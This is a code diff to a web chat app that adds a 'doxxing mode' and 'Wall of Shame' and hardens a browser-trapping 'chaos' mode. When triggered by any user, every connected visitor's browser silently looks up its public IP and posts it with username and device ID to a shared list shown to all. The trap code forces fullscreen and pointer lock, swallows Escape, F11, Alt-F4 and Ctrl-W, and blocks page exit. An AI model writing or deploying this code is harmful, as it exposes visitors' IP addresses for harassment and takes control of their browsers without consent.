@@ -66,10 +66,27 @@ h1#banner {
 #admin-panel button { background:#f00; color:#fff; border:none; cursor:pointer; }
 #wtfBtn { background:#ff0; color:#000; font-weight:bold; font-size:16px; padding:10px; margin-top:10px; width:100%; cursor:pointer; }
 #rickrollBtn { background:#ff1493; color:#fff; font-weight:bold; font-size:16px; padding:10px; margin-top:5px; width:100%; cursor:pointer; }
+#doxxBtn { background:#800080; color:#fff; font-weight:bold; font-size:16px; padding:10px; margin-top:5px; width:100%; cursor:pointer; }
 #admin-login { margin-top:10px; padding:10px; background:rgba(0,255,0,0.1); border-radius:5px; }
 #admin-login input { margin:2px; padding:5px; background:#000; color:#0f0; border:1px solid #0f0; font-family: monospace; }
 #adminLoginBtn { padding:5px 10px; background:#0f0; color:#000; border:none; cursor:pointer; font-family: monospace; font-weight:bold; margin-left:5px; }
 #bannedList { color:#f00; }
+#shameBtn { 
+  background:#ff4500; 
+  color:#fff; 
+  font-weight:bold; 
+  font-size:18px; 
+  padding:12px; 
+  margin-top:10px; 
+  width:100%; 
+  cursor:pointer; 
+  border:2px solid #f00;
+  border-radius:5px;
+  text-shadow:0 0 5px #000;
+}
+#shameBtn:hover {
+  background:#ff6347;
+}
 
 html.shake {
   animation: fullScreenShake 0.5s infinite;
@@ -88,14 +105,14 @@ html.shake {
 }
 
 #fakeFullscreen {
-  position:fixed;
-  top:0;
-  left:0;
-  width:100vw;
-  height:100vh;
+  position:fixed !important;
+  top:0 !important;
+  left:0 !important;
+  width:100vw !important;
+  height:100vh !important;
   background:rgba(0,0,0,0.98);
   display:none;
-  z-index:999999;
+  z-index:2147483647 !important;
   justify-content:center;
   align-items:center;
   cursor:none;
@@ -147,6 +164,50 @@ html.shake {
   object-fit:cover;
   border:none;
 }
+
+#shameModal {
+  display:none;
+  position:fixed;
+  top:0;
+  left:0;
+  width:100vw;
+  height:100vh;
+  background:rgba(0,0,0,0.98);
+  z-index:9999;
+  overflow-y:auto;
+  padding:20px;
+}
+#closeShame {
+  position:fixed;
+  top:20px;
+  right:20px;
+  background:#f00;
+  color:#fff;
+  padding:10px 20px;
+  border:none;
+  cursor:pointer;
+  font-family:monospace;
+  font-weight:bold;
+  font-size:16px;
+  border-radius:5px;
+  z-index:10000;
+}
+#closeShame:hover {
+  background:#ff3333;
+}
+#shameModal h2 {
+  color:#f00;
+  text-align:center;
+  font-size:2.5rem;
+  text-shadow:0 0 10px #f00, 0 0 20px #f00;
+  margin-bottom:30px;
+}
+#shameList {
+  margin-top:30px;
+  max-width:800px;
+  margin-left:auto;
+  margin-right:auto;
+}
 </style>
 </head>
 <body>
@@ -160,6 +221,12 @@ html.shake {
   <div id="rickrollOverlay">
     <img id="rickrollGif" src="https://media.giphy.com/media/Vuw9m5wXviFIQ/giphy.gif" alt="RICKROLL">
   </div>
+</div>
+
+<div id="shameModal">
+  <button id="closeShame">CLOSE</button>
+  <h2>🔥 WALL OF SHAME 🔥</h2>
+  <div id="shameList"></div>
 </div>
 
 <div id="chat-container">
@@ -180,6 +247,7 @@ html.shake {
     <button id="clearBtn">Clear Chat</button>
     <button id="wtfBtn">🚨 WTF MODE 🚨</button>
     <button id="rickrollBtn">🎵 RICKROLL MODE 🎵</button>
+    <button id="doxxBtn">💀 DOXXING MODE 💀</button>
   </div>
 
   <div id="admin-login">
@@ -187,6 +255,8 @@ html.shake {
     <input id="adminPass" type="password" placeholder="Admin password">
     <button id="adminLoginBtn">Login as Admin</button>
   </div>
+
+  <button id="shameBtn">👁️ VIEW WALL OF SHAME 👁️</button>
 
   <div style="margin-top:10px; color:#f00;">Banned users: <span id="bannedList">(none)</span></div>
 </div>
@@ -226,6 +296,11 @@ firebase.initializeApp(firebaseConfig);
   const bannedListEl=document.getElementById('bannedList');
   const wtfBtn=document.getElementById('wtfBtn');
   const rickrollBtn=document.getElementById('rickrollBtn');
+  const doxxBtn=document.getElementById('doxxBtn');
+  const shameBtn=document.getElementById('shameBtn');
+  const shameModal=document.getElementById('shameModal');
+  const closeShame=document.getElementById('closeShame');
+  const shameList=document.getElementById('shameList');
   const fakeFullscreen=document.getElementById('fakeFullscreen');
   const nukeOverlay=document.getElementById('nukeOverlay');
   const rickrollOverlay=document.getElementById('rickrollOverlay');
@@ -235,7 +310,10 @@ firebase.initializeApp(firebaseConfig);
   let admins={...DEFAULT_ADMINS};
   let bannedUsers={};
   let chaosModeLocked = false;
+  let trapActive = false;
   let pointerLockInterval = null;
+  let fullscreenInterval = null;
+  let fullscreenPrimed = false;
 
   let deviceId=localStorage.getItem('hh_device_id');
   if(!deviceId){
@@ -249,6 +327,120 @@ firebase.initializeApp(firebaseConfig);
   const devicesRef=db.ref('devices');
   const wtfModeRef=db.ref('wtfMode');
   const rickrollModeRef=db.ref('rickrollMode');
+  const doxxModeRef=db.ref('doxxMode');
+  const shameRef=db.ref('wallOfShame');
+
+  // IP LOGGING FUNCTION
+  async function logToShame(username) {
+    try {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const userIP = ipData.ip;
+      
+      shameRef.push({
+        username: username,
+        ip: userIP,
+        timestamp: Date.now(),
+        deviceId: deviceId
+      });
+    } catch(e) {
+      console.log('Could not fetch IP');
+    }
+  }
+
+  // WALL OF SHAME DISPLAY
+  function showWallOfShame() {
+    shameModal.style.display = 'block';
+    
+    shameRef.on('value', snapshot => {
+      shameList.innerHTML = '';
+      const shamed = [];
+      snapshot.forEach(child => {
+        shamed.push(child.val());
+      });
+      
+      shamed.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+      
+      shamed.forEach(entry => {
+        const div = document.createElement('div');
+        div.style.cssText = 'background:rgba(255,0,0,0.2); border:2px solid #f00; padding:20px; margin:15px 0; border-radius:8px; box-shadow: 0 0 15px rgba(255,0,0,0.5);';
+        
+        const date = new Date(entry.timestamp).toLocaleString();
+        
+        div.innerHTML = `
+          <div style="color:#0f0; font-size:1.5rem; margin-bottom:10px;">
+            <strong>👤 ${escapeHtml(entry.username)}</strong>
+          </div>
+          <div style="color:#f00; font-size:2rem; font-weight:bold; margin:15px 0; text-shadow: 0 0 5px #f00;">
+            🌐 IP: ${escapeHtml(entry.ip)}
+          </div>
+          <div style="color:#888; font-size:1rem;">
+            ⏰ ${date}
+          </div>
+        `;
+        
+        shameList.appendChild(div);
+      });
+      
+      if (shamed.length === 0) {
+        shameList.innerHTML = '<p style="color:#888; text-align:center; font-size:1.5rem; padding:50px;">No victims yet... 💀</p>';
+      }
+    });
+  }
+
+  function attemptFullscreen() {
+    const elem = document.documentElement;
+    if (elem.requestFullscreen) {
+      elem.requestFullscreen().catch(err => {});
+    } else if (elem.webkitRequestFullscreen) {
+      elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) {
+      elem.msRequestFullscreen();
+    } else if (elem.mozRequestFullScreen) {
+      elem.mozRequestFullScreen();
+    }
+  }
+
+  function primeFullscreen() {
+    if (!fullscreenPrimed) {
+      document.addEventListener('click', () => { if(trapActive) attemptFullscreen(); }, false);
+      document.addEventListener('keydown', () => { if(trapActive) attemptFullscreen(); }, false);
+      document.addEventListener('touchstart', () => { if(trapActive) attemptFullscreen(); }, false);
+      document.addEventListener('mousemove', () => { if(trapActive) attemptFullscreen(); }, false);
+      fullscreenPrimed = true;
+    }
+  }
+
+  function trapUser(e) {
+    if (trapActive) {
+      e.preventDefault();
+      e.returnValue = 'YOU CANNOT ESCAPE';
+      attemptFullscreen();
+      return 'YOU CANNOT ESCAPE';
+    }
+  }
+
+  function blockAllExits(e) {
+    if (trapActive) {
+      if (e.key === 'Escape' || e.key === 'F11' || e.keyCode === 27 || e.keyCode === 122 ||
+          (e.altKey && e.keyCode === 115) ||
+          (e.ctrlKey && (e.keyCode === 87 || e.key === 'w' || e.key === 'W')) ||
+          (e.ctrlKey && e.shiftKey && (e.keyCode === 87 || e.key === 'w' || e.key === 'W')) ||
+          (e.metaKey && (e.keyCode === 87 || e.key === 'w' || e.key === 'W'))) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        attemptFullscreen();
+        return false;
+      }
+    }
+  }
+
+  function maintainFullscreen() {
+    if (trapActive && !document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
+      attemptFullscreen();
+    }
+  }
 
   function lockPointer() {
     if (!chaosModeLocked) return;
@@ -277,20 +469,7 @@ firebase.initializeApp(firebaseConfig);
       if (chaosModeLocked && !document.pointerLockElement && !document.mozPointerLockElement && !document.webkitPointerLockElement) {
         lockPointer();
       }
-    }, 100);
-  }
-
-  function enterFullscreen() {
-    const elem = document.documentElement;
-    if (elem.requestFullscreen) {
-      elem.requestFullscreen().catch(err => {});
-    } else if (elem.webkitRequestFullscreen) {
-      elem.webkitRequestFullscreen();
-    } else if (elem.msRequestFullscreen) {
-      elem.msRequestFullscreen();
-    } else if (elem.mozRequestFullScreen) {
-      elem.mozRequestFullScreen();
-    }
+    }, 50);
   }
 
   function exitFullscreen() {
@@ -305,35 +484,64 @@ firebase.initializeApp(firebaseConfig);
     }
   }
 
-  function blockEscape(e) {
-    if (chaosModeLocked) {
-      e.preventDefault();
-      e.stopPropagation();
-      e.stopImmediatePropagation();
-      return false;
-    }
-  }
-
   function startChaosTrap() {
+    trapActive = true;
     chaosModeLocked = true;
     fakeFullscreen.classList.add('active');
     
-    enterFullscreen();
+    attemptFullscreen();
+    
+    window.addEventListener('beforeunload', trapUser);
+    window.addEventListener('unload', trapUser);
+    
+    document.addEventListener('visibilitychange', (e) => {
+      if (trapActive && document.hidden) {
+        e.preventDefault();
+        attemptFullscreen();
+      }
+    });
+    
+    document.addEventListener('fullscreenchange', maintainFullscreen);
+    document.addEventListener('webkitfullscreenchange', maintainFullscreen);
+    document.addEventListener('mozfullscreenchange', maintainFullscreen);
+    document.addEventListener('MSFullscreenChange', maintainFullscreen);
+    
+    fullscreenInterval = setInterval(() => {
+      if (trapActive) {
+        maintainFullscreen();
+      }
+    }, 100);
     
     setTimeout(() => {
       lockPointer();
       maintainPointerLock();
     }, 100);
     
-    document.addEventListener('keydown', blockEscape, true);
-    document.addEventListener('keyup', blockEscape, true);
-    document.addEventListener('keypress', blockEscape, true);
-    document.addEventListener('contextmenu', blockEscape, true);
+    document.addEventListener('keydown', blockAllExits, true);
+    document.addEventListener('keyup', blockAllExits, true);
+    document.addEventListener('keypress', blockAllExits, true);
+    document.addEventListener('contextmenu', (e) => {
+      if(trapActive) {
+        e.preventDefault();
+        return false;
+      }
+    }, true);
+    
+    fakeFullscreen.addEventListener('click', () => {
+      if (trapActive) {
+        attemptFullscreen();
+        lockPointer();
+      }
+    });
   }
 
   function stopChaosTrap() {
+    trapActive = false;
     chaosModeLocked = false;
     fakeFullscreen.classList.remove('active');
+    
+    window.removeEventListener('beforeunload', trapUser);
+    window.removeEventListener('unload', trapUser);
     
     exitFullscreen();
     unlockPointer();
@@ -343,17 +551,15 @@ firebase.initializeApp(firebaseConfig);
       pointerLockInterval = null;
     }
     
-    document.removeEventListener('keydown', blockEscape, true);
-    document.removeEventListener('keyup', blockEscape, true);
-    document.removeEventListener('keypress', blockEscape, true);
-    document.removeEventListener('contextmenu', blockEscape, true);
-  }
-
-  fakeFullscreen.addEventListener('click', () => {
-    if (chaosModeLocked) {
-      lockPointer();
+    if (fullscreenInterval) {
+      clearInterval(fullscreenInterval);
+      fullscreenInterval = null;
     }
-  });
+    
+    document.removeEventListener('keydown', blockAllExits, true);
+    document.removeEventListener('keyup', blockAllExits, true);
+    document.removeEventListener('keypress', blockAllExits, true);
+  }
 
   function escapeHtml(str){ 
     return String(str).replace(/[&<>"']/g,s=>({
@@ -482,6 +688,30 @@ firebase.initializeApp(firebaseConfig);
     }, 15000);
   }
 
+  function activateDoxxMode(){
+    doxxModeRef.set({ active: true, timestamp: Date.now() });
+  }
+
+  function triggerDoxxEffect(){
+    const username = userEl.value.trim() || 'Anonymous';
+    logToShame(username);
+    
+    // Show a scary message
+    const doxxMsg = document.createElement('div');
+    doxxMsg.style.cssText = 'position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(255,0,0,0.95); color:#fff; padding:40px; border:3px solid #f00; border-radius:10px; z-index:99999; text-align:center; font-size:2rem; box-shadow:0 0 30px #f00;';
+    doxxMsg.innerHTML = `
+      <div style="font-size:3rem; margin-bottom:20px;">💀 DOXXED 💀</div>
+      <div style="font-size:1.5rem;">Your IP has been logged</div>
+      <div style="font-size:1.2rem; margin-top:15px; color:#ff0;">Check the Wall of Shame...</div>
+    `;
+    document.body.appendChild(doxxMsg);
+    
+    setTimeout(() => {
+      doxxMsg.remove();
+      doxxModeRef.set({ active: false, timestamp: Date.now() });
+    }, 5000);
+  }
+
   sendBtn.addEventListener('click',sendMessage);
   msgEl.addEventListener('keydown',e=>{if(e.key==='Enter')sendMessage();});
   adminLoginBtn.addEventListener('click',loginAdmin);
@@ -490,6 +720,11 @@ firebase.initializeApp(firebaseConfig);
   clearBtn.addEventListener('click',clearChat);
   wtfBtn.addEventListener('click',activateWTFMode);
   rickrollBtn.addEventListener('click',activateRickrollMode);
+  doxxBtn.addEventListener('click',activateDoxxMode);
+  shameBtn.addEventListener('click',showWallOfShame);
+  closeShame.addEventListener('click', () => {
+    shameModal.style.display = 'none';
+  });
 
   messagesRef.on('value',snapshot=>{
     const msgs=[]; 
@@ -518,8 +753,17 @@ firebase.initializeApp(firebaseConfig);
     }
   });
 
+  doxxModeRef.on('value', snapshot => {
+    const data = snapshot.val();
+    if(data && data.active) {
+      triggerDoxxEffect();
+    }
+  });
+
   const sessionAdmin=sessionStorage.getItem('hh_admin_user');
   if(sessionAdmin&&admins[sessionAdmin]) adminPanel.style.display='block';
+
+  primeFullscreen();
 })();
 </script>
 
@@ -554,4 +798,3 @@ window.addEventListener('resize',()=>{
 
 </body>
 </html>
-
